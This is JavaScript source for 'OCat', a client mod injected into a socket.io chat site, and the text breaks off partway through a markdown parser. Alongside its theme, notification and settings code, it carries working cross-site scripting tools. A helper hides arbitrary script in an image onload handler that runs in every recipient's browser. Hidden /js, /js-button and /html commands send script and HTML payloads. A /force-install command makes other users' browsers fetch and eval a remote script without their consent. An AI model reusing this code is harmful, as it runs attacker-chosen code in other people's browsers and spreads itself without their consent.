if(!!ocat) throw new Error("Already Injected");

window._OCAT_VICTIM_INJECT = true;
var ocat = {
	_LAST_SEEN_CCAT_HASH: -577453995,
	_START_TIME: Date.now(),
	_EMPTY_IMAGE_URL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII=",
	_notification: new Audio(),
	_currentNotification: null,
	_currentBannerColor: "transparent",
	_banner: document.createElement("div"),
	_bannerTimeOut: -1,
	_bannerQueue: [],
	_bannerMessage(color, msg, maxTime = 0, buttons = [], reverse = false) {
		if(this._bannerTimeOut >= 0) {
			this._bannerQueue.push([color, msg, maxTime, buttons, reverse]);
			return;
		}
		color = color
			.replace("error", "var(--ocat-error-color)")
			.replace("success", "var(--ocat-success-color)");
		// this._banner.style.transform = "translateY(0)";
		this._banner.style.animation = "none";
		this._banner.offsetHeight;
		setTimeout(() => {
			this._banner.textContent = msg;
		}, 150);
		for(var button of buttons) {
			var el = document.createElement("button");
			el.textContent = button.label;
			el.addEventListener("click", button.action);
			el.classList.add("ocat-banner-button");
			this._banner.appendChild(el);
		}
		this._banner.style.backgroundImage = `linear-gradient(${90 + (22.5 * (reverse ? -1 : 1))}deg, ${color} 49%, ${this._currentBannerColor} 51%)`;
		this._banner.style.animation = "ocat-slide-background 0.3s ease 0s 1 normal";
		this._currentBannerColor = color;
		if(maxTime) {
			this._bannerTimeOut = setTimeout(() => {
				this._bannerTimeOut = -1;
				if(this._bannerQueue.length) {
					this._bannerMessage.apply(this, this._bannerQueue.shift());
				} else {
					this._bannerMessage("transparent", "", 0, [], true);
				}
				// this._banner.style.transform = "translateY(-100%)";
			}, maxTime);
		}
	},
	_canvas: new OffscreenCanvas(1, 1).getContext('2d', {
		willReadFrequently: true
	}),
	_parseCSSColor(color) {
		if(color instanceof HTMLImageElement) {
			this._canvas.imageSmoothingEnabled = true;
			this._canvas.drawImage(color, 0, 0, 1, 1);
		} else {
			this._canvas.fillStyle = color;
			this._canvas.fillRect(0, 0, 1, 1);
		}
		const imgd = this._canvas.getImageData(0, 0, 1, 1);
		this._canvas.clearRect(0, 0, 1, 1);
		return imgd.data;
	},
	_isLight(color) {
		var [r, g, b, a] = this._parseCSSColor(color);
		var luma = 0.2126 * r + 0.7152 * g + 0.0722 * b;
		if(color instanceof HTMLImageElement) {
			return luma > 159;
		}
		return luma > 127;
	},
	_notify(msg, type, el) {
		if(document.hasFocus() || document.visibilityState == "visible") return;
		if(msg.includes("ocat-user-ping-message")) return;
		if(this.systemNotifications) {
			var notif = new Notification(`CCat (${type.toUpperCase()})`, {
				body: msg
			});
			notif.addEventListener("click", function(e) {
				notif.close();
				window.focus();
				el.focus();
				el.scrollIntoView({
					behavior: "smooth",
					block: "center"
				});
			});
			this._currentNotification = notif;
		}
		if(!this._notification.paused || this._notification.currentTime) {
			this._notification.pause();
			this._notification.currentTime = 0;
		}
		this._notification.play();
	},
	_clientMessage(msg) {
		socket.listeners("message").forEach(c => c("[OCat]: " + msg, -1));
	},
	_systemNotifications: false,
	get systemNotifications() {
		return this._systemNotifications;
	},
	set systemNotifications(value) {
		if(value) {
			if(Notification.permission != "granted") {
				Notification.requestPermission().then((result) => {
					if(result == "granted") {
						this._systemNotifications = true;
						ocat._saveSettings();
					} else {
						this._clientMessage("Cannot use system notifications without permission.");
					}
				});
			} else {
				this._systemNotifications = true;
			}
		} else {
			this._systemNotifications = false;
		}
	},
	_devMessages: false,
	_pringSQLMessages(msg) {
		console.log(JSON.parse(msg));
	},
	get devMessages() {
		return this._devMessages;
	},
	set devMessages(value) {
		this._devMessages = value;
		document.body.classList.toggle("ocat-dev-messages", value);
		if(value) {
			socket.on("debug", this._pringSQLMessages);
		} else {
			socket.off("debug");
		}
	},
	useMarkdown: false,
	antiXss: false,
	silentTyping: false,
	_vanish: false,
	get vanish() {
		return this._vanish;
	},
	set vanish(value) {
		// readability, yes
		if(this._vanish == value) return;
		if(this._vanish = value) {
			socket.emit("message", `${username} left the chat`);
		} else {
			socket.emit("message", `${username} Joined The Chat.`);
		}
		(this._hooks.pingUsers || (() => { }))();
	},
	_showContextMenu(e, items) {
		e.preventDefault();
		[...document.getElementsByClassName("ocat-context-menu")].forEach(el => el.remove());
		var contextMenuContainer = document.createElement("ul");
		contextMenuContainer.classList.add("ocat-context-menu");
		items.forEach(item => {
			// skip false values for ease of use
			if(!item) return;
			var itemEl = document.createElement("li");
			itemEl.textContent = item.label;
			itemEl.title = item.label;
			if(item.classes) itemEl.classList.add(...item.classes);
			itemEl.addEventListener("click", item.action);
			contextMenuContainer.appendChild(itemEl);
		});
		var left = e.clientX;
		var top = e.clientY;
		contextMenuContainer.style.left = `${left}px`;
		contextMenuContainer.style.top = `${top}px`;
		document.body.appendChild(contextMenuContainer);
		var rect = contextMenuContainer.getBoundingClientRect();
		if(rect.bottom > window.innerHeight - 5) {
			top -= rect.height;
			if(top < 5) top = 5;
		}
		if(rect.right > window.innerWidth - 5) {
			left -= rect.width;
			if(left < 5) left = 0;
		}
		contextMenuContainer.style.left = `${left}px`;
		contextMenuContainer.style.top = `${top}px`;
	},
	async _bufferToBase64(buffer) {
		// use a FileReader to generate a base64 data URI:
		const base64url = await new Promise(r => {
			const reader = new FileReader();
			reader.onload = () => r(reader.result);
			reader.readAsDataURL(new Blob([buffer]));
		});
		// remove the `data:...;base64,` part from the start
		return base64url.substring(base64url.indexOf(',') + 1);
	},
	async _computeHash(blob) {
		const arrayBuffer = await new Promise((resolve, reject) => {
			// Convert to ArrayBuffer
			var fileReader = new FileReader();
			fileReader.onload = () => resolve(fileReader.result);
			fileReader.onerror = () => reject(fileReader.error);
			fileReader.readAsArrayBuffer(blob);
		});
		const digest = await crypto.subtle.digest("SHA-256", arrayBuffer);
		return await this._bufferToBase64(new Uint8Array(digest));
	},
	_fileError(e) {
		this._clientMessage("Could not load file");
		if(this.devMessages) {
			this._clientMessage(`Error: ${e.target.errorCode}`);
		}
	},
	_dbUnsafe: 0,
	_database: null,
	_getDb(callback) {
		if(!this._database) {
			var request = indexedDB.open("ocat-db", 2);
			request.onerror = this._fileError;
			request.onblocked = e => {
				this._clientMessage("Another tab is stopping this one from updating");
			};
			request.onupgradeneeded = e => {
				const db = e.target.result;
				db.onversionchange = e => {
					e.target.close();
					this._clientMessage("A new version of this page is ready. Please reload or close this tab!");
				};
				if(!db.objectStoreNames.contains("files")) {
					db.createObjectStore("files", { keyPath: "hash" });
				}
				if(db.version < 2) {
					this._dbUnsafe++;
					db.objectStore("files").clear().onsuccess = () => this._dbUnsafe--;
				}
				while(this._dbUnsafe) { }
			};
			request.onsuccess = e => {
				this._database = e.target.result;
				if(!this._database.objectStoreNames.contains("files")) {
					this._dbUnsafe++;
					var req = indexedDB.deleteDatabase("ocat-db");
					req.onsuccess = function() {
						location.reload();
					};
				}
				this._database.onversionchange = e => {
					e.target.close();
					this._clientMessage("A new version of this page is ready. Please reload or close this tab!");
				};
				this._database.onerror = this._fileError;
				while(this._dbUnsafe) { }
				callback(this._database);
			};
		} else callback(this._database);
	},
	_addFile(blob, icon, callback) {
		this._getDb(db => {
			this._computeHash(blob).then(hash => {
				const transaction = db.transaction(["files"], "readwrite");
				const fileStore = transaction.objectStore("files");
				const request = fileStore.put({
					hash: hash,
					icon: icon,
					blob: blob
				});
				request.onsuccess = e => {
					callback(hash);
				};
			});
		});
	},
	_getFile(key, callback) {
		this._getDb(db => {
			db.transaction(["files"], "readonly")
				.objectStore("files")
				.get(key)
				.onsuccess = e => {
					callback(e.target.result.blob);
				};
		});
	},
	_removeFile(hash) {
		this._getDb(db => {
			db.transaction(["files"], "readwrite")
				.objectStore("files")
				.delete(hash);
		});
	},
	_forAllFiles(callback) {
		this._getDb(db => {
			db.transaction(["files"], "readonly")
				.objectStore("files")
				.openCursor()
				.onsuccess = e => {
					const cursor = e.target.result;
					if(cursor) {
						if(!cursor.value.icon) {
							this._removeFile(cursor.value.hash);
						} else {
							callback(cursor.value);
						}
						cursor.continue();
					}
				};
		});
	},
	_themeUrl: null,
	_theme: "darkmode",
	get theme() {
		return this._theme;
	},
	set theme(value) {
		if(!this._themes.includes(value) && !/^custom-background\((['"])(.*)\1\)$/.test(value)) {
			ocat._clientMessage(`"${value}" is not a valid theme. Valid values are: ${this._themes.join(", ")}`);
			return;
		}
		this._theme = value;
		document.body.classList.remove(...ocat._themes, "ocat-custom-background-theme");
		if(/^custom-background\((['"])(.*)\1\)$/.test(value)) {
			document.body.classList.add("ocat-custom-background-theme");
			var hash = value.replace(/^custom-background\((['"])(.*)\1\)$/, `$2`);
			this._getFile(hash, blob => {
				if(this._themeUrl) URL.revokeObjectURL(this._themeUrl);
				this._themeUrl = URL.createObjectURL(blob);
				document.body.style.setProperty("--ocat-custom-background", `url("${this._themeUrl}")`);
				var img = new Image();
				img.addEventListener("load", e => {
					if(this._isLight(e.target)) {
						// light background, light mode
						document.body.classList.remove("ocat-dark-style");
					} else {
						document.body.classList.add("ocat-dark-style");
					}
				});
				img.src = this._themeUrl;
			});
		} else {
			localStorage.theme = value;
			document.body.classList.add(value);
			if(this._isLight(window.getComputedStyle(document.body).color)) {
				// Light text, dark mode
				document.body.classList.add("ocat-dark-style");
			} else {
				document.body.classList.remove("ocat-dark-style");
			}
		}
	},
	_addThemeTooltip(el, open, close) {
		var tooltip = document.createElement("div");
		tooltip.classList.add("ocat-tooltip");
		tooltip.classList.add("ocat-theme-tooltip");
		el.addEventListener("mouseenter", function(e) {
			tooltip.style.setProperty("--ocat-tooltip-shift", "0px");
			tooltip.classList.add("ocat-active");
			var rect = tooltip.getBoundingClientRect();
			var shift = 0;
			if(rect.right + 5 > window.innerWidth) {
				shift = window.innerWidth - rect.right - 5;
			} else if(rect.left < 5) {
				shift = 5 - rect.left;
			}
			tooltip.style.setProperty("--ocat-tooltip-shift", `${shift}px`);
			open(tooltip);
		});
		el.addEventListener("mouseleave", function(e) {
			tooltip.classList.remove("ocat-active");
			close(tooltip);
		});
		el.appendChild(tooltip);
		return tooltip;
	},
	_hoveredUrl: null,
	_customThemeButton: document.body,
	_addThemeButton(hash, icon) {
		var iconUrl = URL.createObjectURL(icon);
		var button = document.createElement("button");
		button.classList.add("ocat-settings-button");
		button.classList.add("ocat-theme-button");
		button.classList.add("ocat-theme-button-removable");
		this._addThemeTooltip(button, function(t) {
			ocat._getFile(hash, file => {
				if(ocat._hoveredUrl) URL.revokeObjectURL(ocat._hoveredUrl);
				ocat._hoveredUrl = URL.createObjectURL(file);
				t.style.backgroundImage = `url("${ocat._hoveredUrl}")`;
			});
		}, t => {
			if(ocat._hoveredUrl) URL.revokeObjectURL(ocat._hoveredUrl);
		});
		button.style.backgroundImage = `url("${iconUrl}")`;
		button.addEventListener("click", function(e) {
			e.stopPropagation();
			if(e.shiftKey) {
				e.preventDefault();
				ocat._removeFile(hash);
				URL.revokeObjectURL(iconUrl);
				e.target.remove();
			} else {
				document.getElementById("ocat-theme-tooltip").classList.toggle("ocat-active", false);
				ocat.theme = `custom-background("${hash}")`;
				ocat._saveSettings();
			}
		});
		this._customThemeButton.parentElement.insertBefore(button, this._customThemeButton);
	},
	_notificationSound: "",
	get notificationSound() {
		return this._notificationSound;
	},
	set notificationSound(value) {
		this._notificationSound = value;
		this._notification.src = value;
		this._notification.load();
	},
	_SETTINGS_KEY: "ocatSettingsStorage",
	_saveSettings() {
		var settings = {};
		for(var key in this) {
			if(!key.startsWith("_")) {
				if(ocat[key] instanceof Set) {
					settings[key] = [...ocat[key]];
				} else {
					settings[key] = ocat[key];
				}
			}
		}
		localStorage.setItem(this._SETTINGS_KEY, JSON.stringify(settings));
		console.log("saved settings:", settings);
	},
	_sendJsPayload(code, persistant = false) {
		code += ";this.parentElement.remove();";
		var img = document.createElement("img");
		img.src = "://__OCAT_IMAGE_SRC_GOES_HERE__";
		img.setAttribute("onload", code);
		if(persistant) img.classList.add("ocat-persistant");
		img.style.width = 0;
		img.style.height = 0;
		socket.emit("html-message", img.outerHTML.replace(/(src\s*=\s*(['"]?)).*?:\/\/__OCAT_IMAGE_SRC_GOES_HERE__\2 /, `$1${this._EMPTY_IMAGE_URL}$2`));
	},
	_deleteMessage(id) {
		// this._sendJsPayload(`document.querySelector('#message-container > div[data-message-id="${id}"]')?.remove();`);
		socket.emit("delete-message", id);
	},
	_editMessage(id, content) {
		this._sendJsPayload(`(document.querySelector('#message-container > div[data-message-id="${id}"]') || {}).innerHTML = ${JSON.stringify(content)};`, true);
	},
	_blockedUsers: new Set(),
	get blockedUsers() {
		return this._blockedUsers;
	},
	set blockedUsers(value) {
		if(value instanceof Array) value = new Set(value);
		this._blockedUsers = value;
	},
	_hooks: {},
	_xssIds: {},
	_userHistory: {},
	_commands: [
		{
			name: "help",
			action: m => {
				var helpMessage = "";
				for(var cmd of ocat._commands) {
					if(cmd.secret && !m.includes("ocat-show-secrets")) continue;
					helpMessage += `- /${cmd.name}${cmd.usage ? " " + cmd.usage : ""}: ${cmd.description()}\n`;
				}
				ocat._clientMessage(helpMessage);
			},
			description: () => "Show this help menu."
		},
		{
			name: "block",
			usage: "<username...>",
			action: m => {
				ocat.blockedUsers.add(m.substring(7));
			},
			description: () => "Blocks a user, hiding their chat messages from you."
		},
		{
			name: "unblock",
			usage: "<username...>",
			action: m => {
				ocat.blockedUsers.delete(m.substring(9));
			},
			description: () => "Unblocks a user."
		},
		{
			name: "raw",
			usage: "<message...>",
			action: m => {
				socket.emit("message", m.substring(5));
			},
			description: () => "Send a message without showing your username."
		},
		{
			name: "dm",
			usage: "<user> <message...>",
			action: m => {
				var args = m.split(" ");
				args.shift(); // "/dm"
				var target = args.shift();
				function escape(msg) {
					return msg
						.replace(/'/g, `'+String.fromCharCode(${"'".charCodeAt(0)})+'`)
						.replace(/"/g, `'+String.fromCharCode(${'"'.charCodeAt(0)})+'`);
				}
				ocat._sendJsPayload(`if(username=='${target}'){socket.listeners('message').forEach(c=>c('[DM] ${escape(username)} -> ${escape(target)}: ${escape(args.join(" "))}'));socket.emit("delete-message", this.parentElement.dataset.messageId)}`, true);
				socket.listeners('message').forEach(c => c(`[DM] ${username} -> ${target}: ${args.join(" ")}`))
			},
			description: () => "Send a private message to the specified user."
		},
		{
			name: "html",
			usage: "<content...>",
			action: m => {
				socket.emit("html-message", m.substring(6));
			},
			description: () => "Send an HTML payload."
		},
		{
			name: "js",
			usage: "<script...>",
			secret: true,
			action: m => {
				ocat._sendJsPayload(m.substring(4));
			},
			description: () => "Send a javascript payload."
		},
		{
			name: "js-button",
			usage: "<script...>",
			secret: true,
			action: m => {
				socket.emit("message", m.substring(11).replaceAll(" ", "") + "//https://google.com");
			},
			description: () => "Send a javascript payload (Note: spaces removed)."
		},
		{
			name: "share-ocat",
			action: m => {
				// socket.emit("message", `Install ocat: javascript:fetch('https://raw.githubusercontent.com/wntiv-main/ocat/main/patch.js').then(r=>r.text().then(eval));`, room);
				socket.emit("html-message",
					`<a class="ocat-link" href="javascript:fetch('https://raw.githubusercontent.com/wntiv-main/ocat/main/patch.js').then(r => r.text().then(eval));">Install OCat</a><br/>
				(You can drag this link onto your bookmarks bar to always easily install the latest OCat version)`);
			},
			description: () => "Send OCat install script."
		},
		{
			name: "force-install",
			usage: "[username]",
			secret: true,
			action: m => {
				var args = m.split(" ");
				args.shift();
				var user = args.join(" ");
				var script = `fetch('https://raw.githubusercontent.com/wntiv-main/ocat/main/patch.js').then(r => r.text().then(eval));`;
				if(user) script = `if(username == '${user}') ${script}`;
				ocat._sendJsPayload(script);
			},
			description: () => "Install OCat on another user, or on all users."
		},
	]
};

socket.io.on("error", (error) => {
	ocat._bannerMessage("error", "Cannot connect, check your internet.");
});

socket.io.on("reconnect", (attempt) => {
	ocat._bannerMessage("success", "Reconnected", 3000);
	ocat._hooks.pingUsers();
});

socket.io.on("reconnect_attempt", (attempt) => {
	ocat._bannerMessage("error", "Cannot connect, check your internet. Retrying...");
});

socket.io.on("reconnect_error", (error) => {
	ocat._bannerMessage("error", "Cannot connect, check your internet.");
});

socket.io.on("reconnect_failed", () => {
	ocat._bannerMessage("error", "Could not connect. Wait a bit, and then try again.", 0, [{
		label: "Reload",
		action: location.reload
	}]);
});

[...document.styleSheets].forEach(sheet => {
	for(var i = 0; i < sheet.cssRules.length; i++) {
		if(sheet.cssRules[i] instanceof CSSStyleRule && /^(\.|#)ocat/.test(sheet.cssRules[i].selectorText)) {
			sheet.deleteRule(i--);
		}
	}
});

// Clear old content
var ocat_msgContainer = document.getElementById("message-container");
ocat_msgContainer.replaceWith(ocat_msgContainer.cloneNode(false));

var ocat_bannerContainer = document.createElement("div");
ocat_bannerContainer.classList.add("ocat-banner-container");
ocat._banner.classList.add("ocat-banner");
ocat_bannerContainer.appendChild(ocat._banner);
document.getElementById("message-container").prepend(ocat_bannerContainer);

document.addEventListener("visibilitychange", () => {
	if(document.visibilityState === "visible") {
		// The tab has become visible so clear the now-stale Notification.
		if(ocat._currentNotification)
			ocat._currentNotification.close();
	}
});

String.prototype.hashCode = function() {
	var hash = 0,
		i, chr;
	if(this.length === 0) return hash;
	for(i = 0; i < this.length; i++) {
		chr = this.charCodeAt(i);
		hash = ((hash << 5) - hash) + chr;
		hash |= 0; // Convert to 32bit integer
	}
	return hash;
};

function addToggleSettingCommand(name, desc, msgFn, secret = false) {
	ocat._commands.push({
		// kebab-case: https://stackoverflow.com/a/67243723
		name: name.replace(/[A-Z]+(?![a-z])|[A-Z]/g, ($, ofs) => (ofs ? "-" : "") + $.toLowerCase()),
		secret: secret,
		action: m => {
			var msg = msgFn(ocat[name] = !ocat[name]);
			ocat._saveSettings();
			ocat._clientMessage(msg);
		},
		description: () => `${desc} Currently: ${ocat[name] ? "enabled" : "disabled"}`
	});
};

function addStringSettingCommand(name, desc, msgFn, secret = false) {
	ocat._commands.push({
		// kebab-case: https://stackoverflow.com/a/67243723
		name: name.replace(/[A-Z]+(?![a-z])|[A-Z]/g, ($, ofs) => (ofs ? "-" : "") + $.toLowerCase()),
		usage: "<string...>",
		secret: secret,
		action: msg => {
			var args = msg.split(" ");
			args.shift();
			var msg = msgFn(ocat[name] = args.join(" "));
			ocat._saveSettings();
			ocat._clientMessage(msg);
		},
		description: () => `${desc} Currently set to: ${ocat[name]}`
	});
};

addToggleSettingCommand("systemNotifications", "Toggles sending system notifications when messages are received.", b => `${b ? "Enabled" : "Disabled"} system notifications`);
addStringSettingCommand("theme", "Sets the theme.", s => `Switched to ${s}`);
addToggleSettingCommand("useMarkdown", "Allows use of markdown in chat messages.", b => `${b ? "Enabled" : "Disabled"} markdown parser`);
addToggleSettingCommand("antiXss", "Remove XSS payloads.", b => `${b ? "Now" : "No longer"} checking payloads for XSS.`, true);
addToggleSettingCommand("silentTyping", "Do not show users that you are typing.", b => `${b ? "Now" : "No longer"} silently typing.`);
addToggleSettingCommand("vanish", "Dissappear from chat.", b => `${b ? "Now" : "No longer"} vanished.`, true);
addStringSettingCommand("notificationSound", "Set the notification sound by URL.", s => `Set notification sound to ${s}.`);
addToggleSettingCommand("devMessages", "Verbose messages intended for OCat developers.", b => `${b ? "Now" : "No longer"} showing verbose developer messages.`, true);

var css = document.createElement("style");
css.textContent = `
html, body {
	margin: 0;
	padding: 0;
	font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
	background-size: cover;
	overflow: hidden;
}

body {
	--ocat-error-color: #ff404080;
	--ocat-success-color: #40ff4080;
}

.darkmode {
	background: #1e1e1e;
}

.ocat-dark-style {
	--ocat-error-color: #bf000080;
	--ocat-success-color: #00bf0080;
}

.ocat-custom-background-theme {
	background-image: var(--ocat-custom-background);
	background-position: center;
	background-size: cover;
	box-shadow: inset 0 0 0px 50vw #ffffff75;
	color: black;
}

.ocat-dark-style.ocat-custom-background-theme,
.ocat-dark-style .ocat-custom-background-theme {
	box-shadow: inset 0 0 0px 50vw #00000075;
	color: white;
}

.minecraftthemeone,
.minecraftthemetwo,
.minecraftthemethree {
	box-shadow: inset 0 0 0px 50vw #00000075;
}

.ocat-input-container {
	display: flex;
	align-items: center;
	min-width: 160px;
	background: white;
	border: 1px solid #a0a0a0;
	border-radius: 10px;
	padding: 0.6em;
	overflow: hidden;
	font-family: sans-serif;
	font-size: 1rem;
	cursor: text;
	margin-right: 1ch;
	max-height: 3em;
}

.ocat-input-container,
#message-input {
	background: #80808050;
}

.ocat-input-container > input,
#message-input {
	color: inherit;
}

.ocat-input-container .ocat-prefix {
	user-select: none;
	color: #999;
}

.ocat-input-container input {
	flex-grow: 1;
	background: transparent;
	border: none;
	outline: none;
	padding: 0;
	font-size: 1em;
	width: 100%;
}

.ocat-input-container:focus-within,
#message-input:focus,
.ocat-grow-wrap > #message-input:focus {
	outline: none;
	border-color: #777;
}

.ocat-grow-wrap {
	display: grid;
}

.ocat-grow-wrap::after {
	content: attr(data-replicated-value) " ";
	white-space: pre-wrap;
	visibility: hidden;
}

.ocat-grow-wrap > textarea {
	resize: none;
	overflow: hidden;
}

.ocat-grow-wrap > textarea,
.ocat-grow-wrap::after {
	grid-area: 1 / 1 / 2 / 2;
}

#message-container > div:not(.ocat-banner-container) {
	max-width: 100%;
	overflow-x: auto;
	white-space: pre-line;
	position: relative;
	padding: 12px 24px;
}

#message-container > div:not(.ocat-banner-container):focus {
	box-shadow: inset yellow 0px 0px 8px 0px, yellow 0px 0px 8px 0px;
}

#typing-users {
	position: static;
	padding: 3px 8px 5px 8px;
	font-size: 0.8em;
	color: #777;
	min-height: 1em;
	transition: min-height 0.3s ease, height 0.3s ease, padding-bottom 0.3s ease, padding-top 0.3s ease;
	overflow: hidden;
}

#typing-users::before {
	content: "";
	background-image: url(https://assets-v2.lottiefiles.com/a/57f6e96a-117f-11ee-b56d-e33bc9416452/ibgqn49kqf.gif);
	width: 1em;
	height: 1em;
	display: inline-block;
	background-size: contain;
	transform: scale(2, -2) translateY(-4px);
	margin: 0 1em 0 0.5em;
	filter: invert(1) brightness(0.5) blur(0.3px);
}

#typing-users:not(.show-dots) {
	min-height: 0;
	height: 0;
	padding-bottom: 0;
	padding-top: 0;
}

#ocat-input-wrapper {
	flex-grow: 1;
	background: transparent;
	border-radius: 10px;
	overflow: hidden;
}

.ocat-grow-wrap > #message-input,
.ocat-grow-wrap:has(> #message-input)::after {
	margin: 0;
	padding: 0.6em;
	border-radius: 10px;
	font-family: sans-serif;
	font-size: 1rem;
	min-height: 1.2em;
	max-height: 50vh;
	border: 1px solid #a0a0a0;
	overflow-y: auto;
	overflow-y: overlay;
	position: static;
	box-sizing: border-box;
	overflow-wrap: anywhere;
	scrollbar-gutter: stable;
	box-shadow: 0 0 0 100vh #e0e0e0;
}

.ocat-dark-style .ocat-grow-wrap > #message-input,
.ocat-dark-style .ocat-grow-wrap:has(> #message-input)::after {
	box-shadow: 0 0 0 100vh #202020;
}

body {
	display: grid;
	grid-template-columns: 1fr max-content;
	grid-template-rows: 1fr auto;
	grid-template-areas:
		"chat sidebar"
		"input sidebar";
	width: 100%;
	height: 100vh;
	overflow: hidden;
}

#ocat-message-toolbar {
	grid-area: input;
	height: unset;
	min-height: 3em;
	display: flex;
	align-items: center;
	padding: 6px;
	backdrop-filter: blur(10px);
}

#message-container {
	grid-area: chat;
	overflow-x: hidden;
	overflow-y: auto;
	position: relative;
	padding: 0;
}

#message-container > div:not(.ocat-banner-container) {
	padding: 12px;
}

#message-container > div:not(.ocat-banner-container):nth-of-type(odd) {
	background: #80808020;
}

#message-container > div:not(.ocat-banner-container):hover {
	background: #80808040;
}

#message-container > div:has(> .ocat-left) {
	display: flex;
}

#message-container > div > .ocat-left {
	margin-right: 0.5ch;
	min-width: max-content;
}

#message-container > div > .ocat-blocked {
	display: none;
}

#message-container > div:has(> img.ocat-user-ping-message) {
	padding: 0;
	height: 0px;
	background: transparent !important;
}

.ocat-dev-messages #message-container > div::before {
	content: attr(data-message-id);
	float: right;
	color: #777;
	font-size: 0.8em;
	position: absolute;
	right: 12px;
	text-transform: uppercase;
}

#ocat-sidebar {
	grid-area: sidebar;
	width: 20vw;
	min-width: 200px;
	max-width: 300px;
	border-left: 1px solid #aaa;
	display: flex;
	flex-direction: column;
	backdrop-filter: blur(10px);
}

#ocat-member-list {
	display: block;
	margin: 0;
	padding: 0;
	flex-grow: 1;
	overflow-y: auto;
}

#ocat-settings-container {
}

#ocat-member-list li {
	list-style: none;
	padding: 12px;
	border-left: 10px solid #aaa;
	position: relative;
}

#ocat-member-list li::after {
	content: attr(data-channel);
	float: right;
	color: #777;
	font-size: 0.8em;
	position: absolute;
	right: 12px;
	text-transform: uppercase;
}

#ocat-member-list li:hover::after {
	text-decoration: underline;
}

#ocat-member-list li:hover {
	background: #80808020;
}

#ocat-member-list li.ocat-online {
	border-left: 10px solid green;
}

.ocat-footer-room-id {
	color: #777;
	font-size: 0.8em;
}

.ocat-banner-container {
	position: sticky;
	z-index: 1;
	top: 0;
	padding: 0;
}

.ocat-banner {
	position: absolute;
	background: transparent;
	box-sizing: border-box;
	width: 100%;
	padding: 0.5em;
	text-align: center;
	top: 0;
	/* transform: translateY(-100%); */
	background-size: 210% 100%;
	background-position-x: 0%;
	/* transition: transform 0.3s ease; */
	animation-fill-mode: forwards;
}

.ocat-banner-button {
	color: currentColor;
	border: 1px solid currentColor;
	border-radius: 0.25em;
	background: transparent;
	font-size: 1em;
	margin: 0 0.5ch;
}

.ocat-banner-button:hover {
	background: #80808030;
}

.ocat-banner-button:active {
	background: #80808050;
}

@keyframes ocat-slide-background {
	from {
		background-position-x: 100%;
	}
	to {
		background-position-x: 0%;
	}
}

.ocat-link {
	color: blue;
}

.ocat-dark-style .ocat-link {
	color: #00c0ff;
}

.ocat-tooltip {
	--ocat-tooltip-background: #e0e0e0;
	padding: 5px;
	margin: 5px;
	position: absolute;
	transform: translateY(-100%);
	top: -10px;
	border: 1px solid #777;
	border-radius: 12px;
	z-index: 1;
	overflow: visible;
	display: none;
}

.ocat-dark-style .ocat-tooltip {
	--ocat-tooltip-background: #202020;
}

.ocat-tooltip.ocat-active {
	display: block;
}

#ocat-theme-tooltip {
	padding: 0;
	background: var(--ocat-tooltip-background);
}

#ocat-theme-tooltip .ocat-grid {
	--ocat-theme-scroll: 0px;
	display: grid;
	grid-auto-flow: column;
	grid-template-columns: repeat(auto-fit, calc(1em + 18px));
	grid-template-rows: repeat(4, 1fr);
	grid-gap: 10px 10px;
	max-width: 50vw;
	overflow-x: auto;
	padding: 8px;
	border-radius: 8px;
}

#ocat-theme-tooltip .ocat-grid .ocat-settings-button {
	margin: 0;
}

.ocat-tooltip::after {
	content: "";
	width: 12px;
	height: 12px;
	position: absolute;
	background: var(--ocat-tooltip-background);
	bottom: -7px;
	transform: rotate(45deg);
	border-bottom: 1px solid #777;
	border-right: 1px solid #777;
	z-index: -1;
}

#ocat-theme-tooltip::after {
	right: 12px;
}

.ocat-theme-tooltip {
	--ocat-tooltip-shift: 0px;
	background-size: cover;
	background-position: center;
	min-width: 200px;
	width: 50vw;
	max-width: 800px;
	aspect-ratio: 16/9;
	transform: translate(calc(-50% + var(--ocat-tooltip-shift) - var(--ocat-theme-scroll)), calc(-100% - 32px));
	top: unset;
}

.ocat-theme-tooltip::after {
	background: linear-gradient(315deg, var(--ocat-tooltip-background) 50%, transparent 50%);
	transform: translateX(calc(-2px - var(--ocat-tooltip-shift))) rotate(45deg);
}

#ocat-settings-container {
	display: flex;
	flex-direction: row-reverse;
	position: relative;
}

.ocat-settings-button {
	font-size: 1em;
	text-align: center;
	line-height: 1em;
	padding: 8px;
	min-width: 1em;
	min-height: 1em;
	border: 1px solid #777;
	box-sizing: content-box;
	border-radius: 8px;
	margin: 5px;
	background-position: center;
	background-size: cover;
}

.ocat-settings-button:not([class*="theme"]):not([class*="mode"]) {
	background: transparent;
}

.ocat-settings-button:not([class*="theme"]):not([class*="mode"]):hover {
	background: #80808030;
}

.ocat-settings-button:not([class*="theme"]):not([class*="mode"]):active {
	background: #80808050;
}

.ocat-shifting .ocat-theme-button-removable {
	border: 1px solid red;
}

#ocat-random-theme-button {
	padding: 9px 10px 7px 6px;
}

#ocat-custom-theme-label::after {
	content: "";
	display: block;
	background: url("https://cdn-icons-png.flaticon.com/512/4211/4211763.png");
	background-size: cover;
	margin: -3px;
	width: calc(100% + 6px);
	height: calc(100% + 6px);
}

.ocat-dark-style #ocat-custom-theme-label::after {
	filter: invert(1);
}

.ocat-context-menu {
	position: fixed;
	background: #80808030;
	overflow-y: auto;
	max-height: calc(100vh - 10px);
	margin: 0;
	padding: 0;
	border-radius: 16px;
	min-width: 250px;
	max-width: 400px;
	backdrop-filter: blur(10px);
	border: 1px solid currentColor;
}

.ocat-context-menu > li {
	padding: 5px 16px;
	text-wrap: nowrap;
	text-overflow: ellipsis;
	user-select: none;
}

.ocat-context-menu > li:hover {
	background: #80808030;
}

.ocat-context-menu > li:active {
	background: #80808050;
}

.ocat-context-menu > li:first-of-type {
	padding-top: 16px;
}

.ocat-context-menu > li:last-of-type {
	padding-bottom: 16px;
}

.ocat-important-action {
	color: red;
}
`;
document.head.appendChild(css);

ocat._hooks.markdown = (name, msg) => {
	var replacements = [
		{
			symbol: "**",
			regex: /(?<!\\)\*{2}([^\*](?:.|\n)*?)(?<!\\)\*{2}/g,
			element: "span",
			attr: e => e.style.fontWeight = "bold"
		},
		{
			symbol: "*",
			regex: /(?<!\\)\*((?:.|\n)+?)(?<!\\)\*/g,
			element: "span",
			attr: e => e.style.fontStyle = "italic"
		},
		{
			symbol: "__",
			regex: /(?<!\\)_{2}([^_](?:.|\n)*?)(?<!\\)_{2}/g,
			element: "span",
